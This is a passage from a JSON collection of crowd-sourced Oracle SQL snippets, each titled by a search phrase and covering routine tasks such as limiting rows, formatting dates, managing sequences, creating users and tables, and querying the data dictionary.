    "description": "SELECT * FROM (SELECT [COLUMNS] FROM [TABLE] ORDER BY [DATE] DESC)     WHERE ROWNUM >= 1 AND ROWNUM <=10; -- Oracle 12c: SELECT * FROM (SELECT [COLUMNS] FROM [TABLE] ORDER BY [DATE] DESC)      FETCH FIRST 10 ROWS ONLY;\n-- NOTE: This is for Oracle/PLSQL only  -- > EXAMPLE select *  from CONSUMERS where ROWNUM <= 1  /* -- > SYNTAX select *  from {yourTable} where ROWNUM <= {number-of-rows}  */\nSELECT * FROM (   SELECT DISTINCT    APP_ID,    NAME,    STORAGE_GB,    HISTORY_CREATED,    TO_CHAR(HISTORY_DATE, 'DD.MM.YYYY') AS HISTORY_DATE     FROM HISTORY WHERE      STORAGE_GB IS NOT NULL AND        APP_ID NOT IN (SELECT APP_ID FROM HISTORY WHERE TO_CHAR(HISTORY_DATE, 'DD.MM.YYYY') ='06.02.2009')   ORDER BY STORAGE_GB DESC ) WHERE ROWNUM <= 10 \n",
    "reg_date": "2021-10-12T09:58:31.000Z"
  },
  {
    "id": 2909,
    "keyword": null,
    "link": null,
    "title": " oracle select first result",
    "description": "SELECT * FROM (SELECT [COLUMNS] FROM [TABLE] ORDER BY [DATE] DESC)     WHERE ROWNUM = 1; -- Oracle 12c: SELECT * FROM (SELECT [COLUMNS] FROM [TABLE] ORDER BY [DATE] DESC)      FETCH FIRST 1 ROW ONLY; SELECT * FROM (SELECT [COLUMNS] FROM [TABLE] ORDER BY [DATE] DESC)      FETCH FIRST 10 ROW ONLY; SELECT * FROM (SELECT [COLUMNS] FROM [TABLE] ORDER BY [DATE] DESC)      FETCH FIRST 10 ROWS ONLY;\n-- NOTE: This is for Oracle/PLSQL only  -- > EXAMPLE select *  from CONSUMERS where ROWNUM <= 1  /* -- > SYNTAX select *  from {yourTable} where ROWNUM <= {number-of-rows}  */\n",
    "reg_date": "2021-10-12T09:58:31.000Z"
  },
  {
    "id": 2910,
    "keyword": null,
    "link": null,
    "title": " oracle select first row",
    "description": "SELECT * FROM (SELECT [COLUMNS] FROM [TABLE] ORDER BY [DATE] DESC)     WHERE ROWNUM >= 1 AND ROWNUM <=10; -- Oracle 12c: SELECT * FROM (SELECT [COLUMNS] FROM [TABLE] ORDER BY [DATE] DESC)      FETCH FIRST 10 ROWS ONLY;\nSELECT * FROM (SELECT [COLUMNS] FROM [TABLE] ORDER BY [DATE] DESC)     WHERE ROWNUM = 1; -- Oracle 12c: SELECT * FROM (SELECT [COLUMNS] FROM [TABLE] ORDER BY [DATE] DESC)      FETCH FIRST 1 ROW ONLY; SELECT * FROM (SELECT [COLUMNS] FROM [TABLE] ORDER BY [DATE] DESC)      FETCH FIRST 10 ROW ONLY; SELECT * FROM (SELECT [COLUMNS] FROM [TABLE] ORDER BY [DATE] DESC)      FETCH FIRST 10 ROWS ONLY;\n-- NOTE: This is for Oracle/PLSQL only  -- > EXAMPLE select *  from CONSUMERS where ROWNUM <= 1  /* -- > SYNTAX select *  from {yourTable} where ROWNUM <= {number-of-rows}  */\n",
    "reg_date": "2021-10-12T09:58:31.000Z"
  },
  {
    "id": 2911,
    "keyword": null,
    "link": null,
    "title": " oracle select first row order by",
    "description": "SELECT * FROM (SELECT [COLUMNS] FROM [TABLE] ORDER BY [DATE] DESC)     WHERE ROWNUM = 1; -- Oracle 12c: SELECT * FROM (SELECT [COLUMNS] FROM [TABLE] ORDER BY [DATE] DESC)      FETCH FIRST 1 ROW ONLY; SELECT * FROM (SELECT [COLUMNS] FROM [TABLE] ORDER BY [DATE] DESC)      FETCH FIRST 10 ROW ONLY; SELECT * FROM (SELECT [COLUMNS] FROM [TABLE] ORDER BY [DATE] DESC)      FETCH FIRST 10 ROWS ONLY;\n",
    "reg_date": "2021-10-12T09:58:31.000Z"
  },
  {
    "id": 2912,
    "keyword": null,
    "link": null,
    "title": " oracle select into",
    "description": "SELECT NAME, ADDRESS, PHONE INTO v_employee_name, v_employee_address, v_employee_phone_number FROM EMPLOYEE WHERE EMPLOYYE_ID = 6;\n",
    "reg_date": "2021-10-12T09:58:31.000Z"
  },
  {
    "id": 2913,
    "keyword": null,
    "link": null,
    "title": " oracle select invalid views",
    "description": "SELECT owner, object_type, object_name FROM all_objects WHERE status = 'INVALID'  \n",
    "reg_date": "2021-10-12T09:58:31.000Z"
  },
  {
    "id": 2914,
    "keyword": null,
    "link": null,
    "title": " oracle select row max date",
    "description": "SELECT t1.* FROM employees t1 INNER JOIN (     SELECT id, max(job_start) AS job_start FROM employees GROUP BY id ) t2 ON t1.id = t2.id AND t1.job_start = t2.job_start;\n",
    "reg_date": "2021-10-12T09:58:31.000Z"
  },
  {
    "id": 2915,
    "keyword": null,
    "link": null,
    "title": " oracle select version from dual",
    "description": "SELECT * FROM v$version;\n",
    "reg_date": "2021-10-12T09:58:31.000Z"
  },
  {
    "id": 2916,
    "keyword": null,
    "link": null,
    "title": " oracle sequence last number",
    "description": "SELECT LAST_NUMBER FROM ALL_SEQUENCES WHERE SEQUENCE_NAME = 'seq_name';\n",
    "reg_date": "2021-10-12T09:58:31.000Z"
  },
  {
    "id": 2917,
    "keyword": null,
    "link": null,
    "title": " oracle service name view",
    "description": "select name from V$SERVICES; select name from V$ACTIVE_SERVICES; \n",
    "reg_date": "2021-10-12T09:58:31.000Z"
  },
  {
    "id": 2918,
    "keyword": null,
    "link": null,
    "title": " oracle session date format",
    "description": "ALTER SESSION SET NLS_DATE_FORMAT = 'DD-MM-YYYY HH24:MI:SS'; SELECT sysdate FROM dual;  SELECT to_char(sysdate,'HH24:MI:SS') FROM dual;\n",
    "reg_date": "2021-10-12T09:58:32.000Z"
  },
  {
    "id": 2919,
    "keyword": null,
    "link": null,
    "title": " oracle session parameters",
    "description": "GRANT SELECT_CATALOG_ROLE TO my_user;\t-- to read V$PARAMETER   SELECT NAME, VALUE, DESCRIPTION FROM V$PARAMETER  --WHERE upper(NAME) = 'NLS_DATE_FORMAT'  ORDER BY NAME;  ALTER SESSION SET  \tNLS_LANGUAGE='AMERICAN'      NLS_TERRITORY='AMERICA'      NLS_CALENDAR='GREGORIAN'     NLS_DATE_FORMAT='DD/MM/YYYY HH24:MI:SS';\n",
    "reg_date": "2021-10-12T09:58:32.000Z"
  },
  {
    "id": 2920,
    "keyword": null,
    "link": null,
    "title": " oracle session variables list",
    "description": "GRANT SELECT_CATALOG_ROLE TO my_user;\t-- to read V$PARAMETER   SELECT NAME, VALUE, DESCRIPTION FROM V$PARAMETER  --WHERE upper(NAME) = 'NLS_DATE_FORMAT'  ORDER BY NAME;  ALTER SESSION SET  \tNLS_LANGUAGE='AMERICAN'      NLS_TERRITORY='AMERICA'      NLS_CALENDAR='GREGORIAN'     NLS_DATE_FORMAT='DD/MM/YYYY HH24:MI:SS';\n",
    "reg_date": "2021-10-12T09:58:32.000Z"
  },
  {
    "id": 2921,
    "keyword": null,
    "link": null,
    "title": " oracle set date format",
    "description": "ALTER SESSION SET NLS_DATE_FORMAT = 'DD-MM-YYYY HH24:MI:SS'; SELECT sysdate FROM dual;  SELECT to_char(sysdate,'HH24:MI:SS') FROM dual;\nTO_CHAR (TO_DATE('0297','MM/YY'), 'MM/YY') \nSELECT   TO_DATE( '24-JUL-21', 'DD-MON-RR' ) FROM   dual;\n e.g., 01-JAN-17  \n",
    "reg_date": "2021-10-12T09:58:32.000Z"
  },
  {
    "id": 2922,
    "keyword": null,
    "link": null,
    "title": " oracle set sequence value to max(id)",
    "description": "SELECT LAST_NUMBER FROM ALL_SEQUENCES WHERE SEQUENCE_NAME = 'seq_name';  ALTER SEQUENCE seq_name INCREMENT BY 100;\t-- Value to reach desired value - 1 SELECT seq_name.nextval FROM dual;\t\t\t-- Reinitialize value to desired ALTER SEQUENCE seq_name INCREMENT BY 1;\t\t-- Back to init step\n",
    "reg_date": "2021-10-12T09:58:32.000Z"
  },
  {
    "id": 2923,
    "keyword": null,
    "link": null,
    "title": " oracle show column of table",
    "description": "DESCRIBE Table_Name;  OR   DESC Table_Name;\nSELECT column_name   FROM all_tab_cols  WHERE table_name = 'USERS'    AND owner = '\" +_db+ \"'    AND column_name NOT IN ( 'PASSWORD', 'VERSION', 'ID' ) \n-- Depending on schema grants: SELECT * FROM USER_TAB_COLS WHERE TABLE_NAME = 'my_table';\t-- User tables SELECT * FROM ALL_TAB_COLS WHERE TABLE_NAME = 'my_table';\t-- Access granted SELECT * FROM DBA_TAB_COLS WHERE TABLE_NAME = 'my_table';\t-- All schemas  -- Columns from all tables in a schema (or USER_..., DBA_... instead of ALL_...): SELECT c.TABLE_NAME, c.DATA_TYPE FROM ALL_TAB_COLS c JOIN ALL_TABLES t ON t.OWNER = c.OWNER WHERE OWNER = 'my_schema';\n",
    "reg_date": "2021-10-12T09:58:32.000Z"
  },
  {
    "id": 2924,
    "keyword": null,
    "link": null,
    "title": " oracle show execution plan",
    "description": "-- Without execution EXPLAIN PLAN FOR select ...; SELECT * FROM TABLE(dbms_xplan.display); -- With execution SELECT /*+ gather_plan_statistics */  ...; SELECT * FROM TABLE(dbms_xplan.display_cursor(NULL,NULL,'ALLSTATS LAST'));\n",
    "reg_date": "2021-10-12T09:58:32.000Z"
  },
  {
    "id": 2925,
    "keyword": null,
    "link": null,
    "title": " oracle show grants on table",
    "description": "SELECT * FROM DBA_TAB_PRIVS WHERE TABLE_NAME = 'MY_TABLE';\n",
    "reg_date": "2021-10-12T09:58:32.000Z"
  },
  {
    "id": 2926,
    "keyword": null,
    "link": null,
    "title": " oracle show index columns",
    "description": "SELECT TABLE_NAME, INDEX_NAME, COLUMN_NAME FROM DBA_IND_COLUMNS\t\t\t-- or ALL_IND_COLUMNS WHERE TABLE_OWNER = 'MY_SCHEMA' AND TABLE_NAME = 'MY_TABLE' ORDER BY TABLE_NAME, COLUMN_POSITION;\n",
    "reg_date": "2021-10-12T09:58:32.000Z"
  },
  {
    "id": 2927,
    "keyword": null,
    "link": null,
    "title": " oracle show procedures",
    "description": "-- Depending on connected user grants: SELECT * FROM USER_OBJECTS WHERE OBJECT_TYPE IN ('FUNCTION','PROCEDURE','PACKAGE'); SELECT * FROM ALL_OBJECTS WHERE OBJECT_TYPE IN ('FUNCTION','PROCEDURE','PACKAGE'); SELECT * FROM DBA_OBJECTS WHERE OBJECT_TYPE IN ('FUNCTION','PROCEDURE','PACKAGE');\nSELECT 'CALLED PLSQL' AS STATUT,        VS.USERNAME,        VS.OSUSER,        VS.PROGRAM,        VS.MODULE,        VS.ACTION,        VS.SQL_EXEC_START,        D_O.OBJECT_NAME,        D_O.OBJECT_TYPE FROM DBA_OBJECTS D_O          INNER JOIN V$SESSION VS ON D_O.OBJECT_ID = VS.PLSQL_ENTRY_OBJECT_ID UNION ALL SELECT 'CURRENT PLSQL' AS STATUT,        VS.USERNAME,        VS.OSUSER,        VS.PROGRAM,        VS.MODULE,        VS.ACTION,        VS.SQL_EXEC_START,        D_O.OBJECT_NAME,        D_O.OBJECT_TYPE FROM DBA_OBJECTS D_O          INNER JOIN V$SESSION VS ON D_O.OBJECT_ID = VS.PLSQL_OBJECT_ID;\n-- Specifically for SQL:Oracle  SELECT *  FROM ALL_PROCEDURES;\n",
    "reg_date": "2021-10-12T09:58:32.000Z"
  },
  {
    "id": 2928,
    "keyword": null,
    "link": null,
    "title": " oracle show running job",
    "description": "SELECT * FROM USER_SCHEDULER_RUNNING_JOBS;\t\t-- connected scheme SELECT * FROM ALL_SCHEDULER_RUNNING_JOBS;\t\t-- granted to connected scheme SELECT * FROM DBA_SCHEDULER_RUNNING_JOBS;\t\t-- all jobs (DBA)  -- More details (DBA) SELECT DISTINCT r.OWNER, r.JOB_NAME, r.JOB_SUBNAME, r.ELAPSED_TIME, r.CPU_USED,                 d.ACTUAL_START_DATE FROM DBA_SCHEDULER_RUNNING_JOBS r          LEFT JOIN DBA_SCHEDULER_JOB_RUN_DETAILS d                    ON d.SLAVE_PID = r.SLAVE_PROCESS_ID ORDER BY r.OWNER, r.JOB_NAME, r.JOB_SUBNAME;\n",
    "reg_date": "2021-10-12T09:58:33.000Z"
  },
  {
    "id": 2929,
    "keyword": null,
    "link": null,
    "title": " oracle show running procedures",
    "description": "SELECT 'CALLED PLSQL' AS STATUT,        VS.USERNAME,        VS.OSUSER,        VS.PROGRAM,        VS.MODULE,        VS.ACTION,        VS.SQL_EXEC_START,        D_O.OBJECT_NAME,        D_O.OBJECT_TYPE FROM DBA_OBJECTS D_O          INNER JOIN V$SESSION VS ON D_O.OBJECT_ID = VS.PLSQL_ENTRY_OBJECT_ID UNION ALL SELECT 'CURRENT PLSQL' AS STATUT,        VS.USERNAME,        VS.OSUSER,        VS.PROGRAM,        VS.MODULE,        VS.ACTION,        VS.SQL_EXEC_START,        D_O.OBJECT_NAME,        D_O.OBJECT_TYPE FROM DBA_OBJECTS D_O          INNER JOIN V$SESSION VS ON D_O.OBJECT_ID = VS.PLSQL_OBJECT_ID;\n-- Specifically for SQL:Oracle  SELECT *  FROM ALL_PROCEDURES;\n",
    "reg_date": "2021-10-12T09:58:33.000Z"
  },
  {
    "id": 2930,
    "keyword": null,
    "link": null,
    "title": " oracle show trigger code",
    "description": "SELECT DBMS_METADATA.get_ddl('TRIGGER', TRIGGER_NAME, OWNER) FROM ALL_TRIGGERS\t\t-- or DBA_TRIGGERS, USER_TRIGGERS WHERE OWNER = 'swhema_name'   AND TRIGGER_NAME = 'trigger_name';\n",
    "reg_date": "2021-10-12T09:58:33.000Z"
  },
  {
    "id": 2931,
    "keyword": null,
    "link": null,
    "title": " oracle simple quote",
    "description": "SELECT 'Simple quote''' FROM dual;\t\t-- Simple quote' SELECT '''Simple quote''' FROM dual;\t-- 'Simple quote' SELECT q'['Simple quote']' from dual;\t-- 'Simple quote'  q'[my_string]'  s_date VARCHAR2(10 BYTE) := '12/02/2021'; EXECUTE IMMEDIATE 'SELECT to_date(''' || s_date || ''', ''DD/MM/YYYY'') FROM dual';\n",
    "reg_date": "2021-10-12T09:58:33.000Z"
  },
  {
    "id": 2932,
    "keyword": null,
    "link": null,
    "title": " oracle sleep",
    "description": "BEGIN \tDBMS_SESSION.SLEEP(5);\t\t\t-- waits 5s END;\n",
    "reg_date": "2021-10-12T09:58:33.000Z"
  },
  {
    "id": 2933,
    "keyword": null,
    "link": null,
    "title": " oracle sleep 1 second",
    "description": "BEGIN \tDBMS_SESSION.SLEEP(5);\t\t\t-- waits 5s END;\n",
    "reg_date": "2021-10-12T09:58:33.000Z"
  },
  {
    "id": 2934,
    "keyword": null,
    "link": null,
    "title": " oracle source code",
    "description": "select * from   all_source where  lower(text) like lower('%Some source%');\nSELECT * FROM all_source    -- or user_source or dba_source WHERE upper(text) LIKE '%MY TEXT%' ORDER BY owner, name, type, line;\n",
    "reg_date": "2021-10-12T09:58:33.000Z"
  },
  {
    "id": 2935,
    "keyword": null,
    "link": null,
    "title": " oracle source query",
    "description": "SELECT * FROM all_source    -- or user_source or dba_source WHERE upper(text) LIKE '%MY TEXT%' ORDER BY owner, name, type, line;\n",
    "reg_date": "2021-10-12T09:58:33.000Z"
  },
  {
    "id": 2936,
    "keyword": null,
    "link": null,
    "title": " oracle split string",
    "description": "-- Splits a comma separated string into rows SELECT regexp_substr('SARAH,JOE,PIMPO,LOUIS', '[^,]+', 1, LEVEL) FROM DUAL CONNECT BY regexp_substr('SARAH,JOE,PIMPO,LOUIS', '[^,]+', 1, LEVEL) IS NOT NULL;\n",
    "reg_date": "2021-10-12T09:58:33.000Z"
  },
  {
    "id": 2937,
    "keyword": null,
    "link": null,
    "title": " oracle sql all days except weekends",
    "description": "WHERE TO_CHAR(date_column, 'DY','NLS_DATE_LANGUAGE=AMERICAN') NOT IN ('SAT', 'SUN')\n",
    "reg_date": "2021-10-12T09:58:33.000Z"
  },
  {
    "id": 2938,
    "keyword": null,
    "link": null,
    "title": " oracle sql average",
    "description": "SELECT AVG(col_name) FROM table_name;  SELECT customer, AVG(prices)  FROM buys  GROUP BY customer;\n",
    "reg_date": "2021-10-12T09:58:34.000Z"
  },
  {
    "id": 2939,
    "keyword": null,
    "link": null,
    "title": " oracle sql commit example",
    "description": "-- Rollback (cancellation) DELETE FROM employees WHERE employee_id = 123;    -- Done in current session ROLLBACK;                                         -- Cancelled in current session SELECT * FROM employees WHERE employee_id = 123;  -- Found -- Commit (validation) DELETE FROM employees WHERE employee_id = 123;    -- Done in current session COMMIT;                                           -- Visible for ALL sessions SELECT * FROM employees WHERE employee_id = 123;  -- Missing for ALL sessions\n",
    "reg_date": "2021-10-12T09:58:34.000Z"
  },
  {
    "id": 2940,
    "keyword": null,
    "link": null,
    "title": " oracle sql compile package",
    "description": "ALTER PACKAGE schema_name.package_name COMPILE PACKAGE; ALTER PACKAGE schema_name.package_name COMPILE BODY;\n",
    "reg_date": "2021-10-12T09:58:34.000Z"
  },
  {
    "id": 2941,
    "keyword": null,
    "link": null,
    "title": " oracle sql concatenate results into string",
    "description": "-- Concatenates results into one single varchar with separator SELECT LISTAGG(column_name, ',') WITHIN GROUP (ORDER BY column_name) FROM YOUR_TABLE;\n",
    "reg_date": "2021-10-12T09:58:34.000Z"
  },
  {
    "id": 2942,
    "keyword": null,
    "link": null,
    "title": " oracle sql copy table without data",
    "description": "-- Copy datas and structure: CREATE TABLE new_table AS SELECT * FROM my_table; -- Copy structure only: CREATE TABLE new_table AS SELECT * FROM my_table WHERE 1=0;\n",
    "reg_date": "2021-10-12T09:58:34.000Z"
  },
  {
    "id": 2943,
    "keyword": null,
    "link": null,
    "title": " oracle sql create or replace view",
    "description": "CREATE OR REPLACE VIEW view_name AS SELECT colA, colB  FROM my_table WHERE colC = 'OK';\n",
    "reg_date": "2021-10-12T09:58:34.000Z"
  },
  {
    "id": 2944,
    "keyword": null,
    "link": null,
    "title": " oracle sql create table",
    "description": "CREATE TABLE ot.persons(     person_id NUMBER GENERATED BY DEFAULT AS IDENTITY,     first_name VARCHAR2(50) NOT NULL,     last_name VARCHAR2(50) NOT NULL,     PRIMARY KEY(person_id) );\n/*Deleting whole table with data */ DROP TABLE vehicles; DROP TABLE owners;  /*First create only this table */ CREATE TABLE owners (     owner_id NUMBER,     first_name VARCHAR2(50 CHAR) NOT NULL,          CONSTRAINT owners_pk PRIMARY KEY(owner_id) );  /* One owner got many vehicles, one to many relation \tor one vehicle got many owners */ CREATE TABLE vehicles (     vehicle_id NUMBER,     vehicle_name VARCHAR2(50 CHAR) NOT NULL,        \t/* CONSTRAINT vehicle_pk PRIMARY KEY(vehicle_id) --If we had made PRIMARY KEY here it will be one to one relation */     CONSTRAINT vehicle_owner_fk FOREIGN KEY(vehicle_id) REFERENCES owners(owner_id) ON DELETE SET NULL );   INSERT INTO owners VALUES(1, 'Abbi'); INSERT INTO owners VALUES(2, 'Beatrix'); INSERT INTO owners VALUES(3, 'Caila'); INSERT INTO owners VALUES(4, 'Dea'); INSERT INTO owners VALUES(5, 'Elise');  INSERT INTO vehicles VALUES(1, 'car'); INSERT INTO vehicles VALUES(2, 'motorcycle'); INSERT INTO vehicles VALUES(3, 'airplane1'); INSERT INTO vehicles VALUES(4, 'airplane1'); INSERT INTO vehicles VALUES(4, 'steamer'); INSERT INTO vehicles VALUES(4, 'submarine'); COMMIT;  DELETE FROM projects WHERE vehicle_id = 4 AND vehicle_name = 'submarine';  /* Sometimes Oracle SQL Dev don't like this sign ';',  Primary Key is always NOT NULL UNIQUE, single PK PRIMARY KEY(user_id), allowed combination: (1,1) for example (user_id, project_id) (2,1) (3,1) (4,2)  */   -- one line comment  \nCREATE TABLE utilisateur (     id INT PRIMARY KEY NOT NULL,     nom VARCHAR(100),     prenom VARCHAR(100),     email VARCHAR(255),     date_naissance DATE,     pays VARCHAR(255),     ville VARCHAR(255),     code_postal VARCHAR(5),     nombre_achat INT )\n",
    "reg_date": "2021-10-12T09:58:34.000Z"
  },
  {
    "id": 2945,
    "keyword": null,
    "link": null,
    "title": " oracle sql create table from select",
    "description": "-- Copy a table (datas, columns and storage parameters) CREATE TABLE my_new_table AS SELECT * FROM my_source_table; -- Use NOLOGGING, and PARALLEL if allowed for faster copy CREATE TABLE my_new_table     PARALLEL 10 NOLOGGING AS SELECT /*+ parallel(10) */ * FROM my_source_table; -- To create an empty table: CREATE TABLE my_new_table AS SELECT * FROM my_source_table \tWHERE rownum = 0;\nCREATE TABLE my_table AS SELECT * FROM another_table t WHERE 1=2 --delete the where condition if you also want the data\n",
    "reg_date": "2021-10-12T09:58:34.000Z"
  },
  {
    "id": 2946,
    "keyword": null,
    "link": null,
    "title": " oracle sql create user",
    "description": "-- Oracle - User / schema creation CREATE USER MY_USER IDENTIFIED BY \"MyPassword\" DEFAULT TABLESPACE USERS TEMPORARY TABLESPACE TEMP PROFILE DEFAULT ACCOUNT UNLOCK; GRANT CONNECT TO MY_USER;           -- To connect to DB GRANT RESOURCE TO MY_USER;          -- Access / modify GRANT MY_ROLE TO MY_USER;           -- Grants a role (to be defined) ALTER USER MY_USER DEFAULT ROLE \"RESOURCE\",\"CONNECT\",\"MY_ROLE\"; -- Proxy access ALTER USER MY_USER GRANT CONNECT THROUGH MY_OTHER_USER; -- Checks privileges: SELECT PRIVILEGE FROM DBA_SYS_PRIVS WHERE GRANTEE = MY_USER;\n",
    "reg_date": "2021-10-12T09:58:34.000Z"
  },
  {
    "id": 2947,
    "keyword": null,
    "link": null,
    "title": " oracle sql create view",
    "description": "CREATE VIEW view_name AS SELECT column1, column2, ... FROM table_name WHERE condition;\nCREATE OR REPLACE VIEW view_name AS SELECT colA, colB  FROM my_table WHERE colC = 'OK';\n",
    "reg_date": "2021-10-12T09:58:35.000Z"
  },
  {
    "id": 2948,
    "keyword": null,
    "link": null,
    "title": " oracle sql day of month from date",
    "description": "select extract(day from systimestamp) from dual;\n",
    "reg_date": "2021-10-12T09:58:35.000Z"
  },
  {
    "id": 2949,
    "keyword": null,
    "link": null,
    "title": " oracle sql developer script output not showing",
    "description": "-- SQL Developer :  show View | DBMS Output > Add connection (+) SET SERVEROUTPUT ON; DECLARE \tv_name VARCHAR2(50) := 'Bond'; BEGIN \tDBMS_OUTPUT.PUT_LINE('Hello !'); \tDBMS_OUTPUT.PUT_LINE('My name is ' || v_name); END;\n",
    "reg_date": "2021-10-12T09:58:35.000Z"
  },
  {
    "id": 2950,
    "keyword": null,
    "link": null,
    "title": " oracle sql drop column if exists",
    "description": "DECLARE   l_cnt NUMBER; BEGIN   SELECT COUNT(*) INTO l_cnt      FROM dba_tab_columns    WHERE owner = 'my_owner'      AND table_name = 'my_table' AND column_name = 'my_column';   IF( l_cnt = 1 ) THEN     EXECUTE IMMEDIATE 'ALTER TABLE my_table DROP COLUMN my_column';   END IF; END;\n",
    "reg_date": "2021-10-12T09:58:35.000Z"
  },
  {
    "id": 2951,
    "keyword": null,
    "link": null,
    "title": " oracle sql drop index",
    "description": "DROP INDEX index_name;\n",
    "reg_date": "2021-10-12T09:58:35.000Z"
  },
  {
    "id": 2952,
    "keyword": null,
    "link": null,
    "title": " oracle sql drop sequence",
    "description": "DROP SEQUENCE sequence_name;\nDECLARE     s_exist NUMBER(1); BEGIN     SELECT CASE WHEN exists(SELECT * FROM ALL_SEQUENCES                             WHERE SEQUENCE_NAME = 'seq_name') THEN 1        \tELSE 0      END INTO s_exist FROM DUAL;     IF s_exist = 1 THEN         EXECUTE IMMEDIATE 'DROP SEQUENCE seq_name';     END IF; END;\n",
    "reg_date": "2021-10-12T09:58:35.000Z"
  },
  {
    "id": 2953,
    "keyword": null,
    "link": null,
    "title": " oracle sql drop table",
    "description": "DROP TABLE my_table; -- To 'really' free space DROP TABLE my_table PURGE;\n",
    "reg_date": "2021-10-12T09:58:35.000Z"
  },
  {
    "id": 2954,
    "keyword": null,
    "link": null,
    "title": " oracle sql drop table purge",
    "description": "DROP TABLE customers PURGE;\n",
    "reg_date": "2021-10-12T09:58:35.000Z"
  },
  {
    "id": 2955,
    "keyword": null,
    "link": null,
    "title": " oracle sql first day of month",
    "description": "-- First day of month SELECT TRUNC(sysdate, 'MONTH') from dual;\n-- Oracle: First day of year SELECT TRUNC(sysdate, 'YEAR') FROM DUAL;\n",
    "reg_date": "2021-10-12T09:58:35.000Z"
  },
  {
    "id": 2956,
    "keyword": null,
    "link": null,
    "title": " oracle sql first day of year",
    "description": "-- Oracle: First day of year SELECT TRUNC(sysdate, 'YEAR') FROM DUAL;\n",
    "reg_date": "2021-10-12T09:58:36.000Z"
  },
  {
    "id": 2957,
    "keyword": null,
    "link": null,
    "title": " oracle sql for each row",
    "description": "DECLARE   CURSOR c_product   IS     SELECT          product_name, list_price     FROM          products      ORDER BY          list_price DESC; BEGIN   FOR r_product IN c_product   LOOP     dbms_output.put_line( r_product.product_name || ': $' ||  r_product.list_price );   END LOOP; END;\nBEGIN   FOR r_product IN (         SELECT              product_name, list_price          FROM              products         ORDER BY list_price DESC     )   LOOP      dbms_output.put_line( r_product.product_name ||         ': $' ||          r_product.list_price );   END LOOP; END;\n",
    "reg_date": "2021-10-12T09:58:36.000Z"
  },
  {
    "id": 2958,
    "keyword": null,
    "link": null,
    "title": " oracle sql generate list of days",
    "description": "SELECT trunc(sysdate - ROWNUM) DT FROM DUAL CONNECT BY ROWNUM < 366;\n",
    "reg_date": "2021-10-12T09:58:36.000Z"
  },
  {
    "id": 2959,
    "keyword": null,
    "link": null,
    "title": " oracle sql get string length",
    "description": "SELECT length('abcd') FROM DUAL;\t\t-- Oracle SELECT length('abcd');\t\t\t\t\t-- MySql / PostGreSQL SELECT len('abcd');\t\t\t\t\t\t-- SQL Server\n",
    "reg_date": "2021-10-12T09:58:36.000Z"
  },
  {
    "id": 2960,
    "keyword": null,
    "link": null,
    "title": " oracle sql group by date year",
    "description": "SELECT value1, extract(YEAR FROM my_date) FROM my_table GROUP BY value1, extract(YEAR FROM my_date);\nSelect count(1), country_of_sale, to_char(datefield, 'YYYY-MM') AS yyyymm from table  where country_of_sale IN ('USA', 'EUROPE', 'ASIA') group by country_of_sale, to_char(datefield, 'YYYY-MM') order by to_char(datefield, 'YYYY-MM');\n",
    "reg_date": "2021-10-12T09:58:36.000Z"
  },
  {
    "id": 2961,
    "keyword": null,
    "link": null,
    "title": " oracle sql limit results",
    "description": "-- Oracle <= 11g  SELECT * FROM ( SELECT * FROM emp ORDER BY sal DESC ) WHERE ROWNUM <= 5; \t -- Oracle 12c + SELECT * FROM emp ORDER BY sal DESC FETCH FIRST 5 ROWS ONLY;\t\nSELECT *  FROM   sometable ORDER BY name OFFSET 20 ROWS FETCH NEXT 10 ROWS ONLY;\nSELECT *  FROM   sometable ORDER BY name OFFSET 20 ROWS FETCH NEXT 10 ROWS ONLY; \noracle limit rows\n",
    "reg_date": "2021-10-12T09:58:36.000Z"
  },
  {
    "id": 2962,
    "keyword": null,
    "link": null,
    "title": " oracle sql listagg",
    "description": "SELECT     job_title,     LISTAGG(         first_name,         ','     ) WITHIN GROUP(     ORDER BY         first_name     ) AS employees FROM     employees GROUP BY     job_title ORDER BY     job_title;\n",
    "reg_date": "2021-10-12T09:58:36.000Z"
  },
  {
    "id": 2963,
    "keyword": null,
    "link": null,
    "title": " oracle sql log to console",
    "description": "set serveroutput on format wrapped; begin     DBMS_OUTPUT.put_line('simple comment'); end; /  -- do something  begin     DBMS_OUTPUT.put_line('second simple comment'); end; / \n",
    "reg_date": "2021-10-12T09:58:36.000Z"
  },
  {
    "id": 2964,
    "keyword": null,
    "link": null,
    "title": " oracle sql merge",
    "description": "-- Oracle: Example for Insert or update in t1 from t2 values  MERGE INTO table1 t1 USING table2 t2 ON (t1.CODE = t2.ID) WHEN MATCHED THEN     UPDATE SET t1.COL1 = t2.VALUE1 WHEN NOT MATCHED THEN     INSERT (CODE, COL1)  VALUES (t2.ID, t2.VALUE1);\n",
    "reg_date": "2021-10-12T09:58:36.000Z"
  },
  {
    "id": 2965,
    "keyword": null,
    "link": null,
    "title": " oracle sql number to varchar2",
    "description": "-- Number to Varchar2 DECLARE     myString VARCHAR2(10);     myNumber NUMBER := 100.56; BEGIN     myString := to_char(myNumber);     DBMS_OUTPUT.PUT_LINE(myString);     -- 100,56 END;\n",
    "reg_date": "2021-10-12T09:58:36.000Z"
  },
  {
    "id": 2966,
    "keyword": null,
    "link": null,
    "title": " oracle sql pad left zeros",
    "description": "SHOW LPAD('Page 1',15,'*.')  *.*.*.*.*Page 1 \nSHOW LPAD('column_name',14,'0')  000column_name\n",
    "reg_date": "2021-10-12T09:58:37.000Z"
  },
  {
    "id": 2967,
    "keyword": null,
    "link": null,
    "title": " oracle sql pad zeros",
    "description": "SHOW LPAD('Page 1',15,'*.')  *.*.*.*.*Page 1 \n",
    "reg_date": "2021-10-12T09:58:37.000Z"
  },
  {
    "id": 2968,
    "keyword": null,
    "link": null,
    "title": " oracle sql query to make column data uppercase",
    "description": "UPDATE   MyTable SET   MyColumn = UPPER(MyColumn)\nSELECT upper('Hello World');\t\t-- HELLO WORLD SELECT lower('Hello World');\t\t-- hello world\n",
    "reg_date": "2021-10-12T09:58:37.000Z"
  },
  {
    "id": 2969,
    "keyword": null,
    "link": null,
    "title": " oracle sql return json",
    "description": "CopySELECT json_object('id'          VALUE employee_id,                    'name'        VALUE first_name || ' ' || last_name,                    'hireDate'    VALUE hire_date,                    'pay'         VALUE salary,                    'contactInfo' VALUE json_object('mail'  VALUE email,                                                    'phone' VALUE phone_number)                                        FORMAT JSON)    FROM employees   WHERE salary > 15000;  -- The query returns rows such as this (pretty-printed here for clarity):  {\"id\":101,  \"name\":\"Neena Kochhar\",  \"hireDate\":\"21-SEP-05\",  \"pay\":17000,  \"contactInfo\":{\"mail\":\"NKOCHHAR\",                 \"phone\":\"515.123.4568\"}}\n",
    "reg_date": "2021-10-12T09:58:37.000Z"
  },
  {
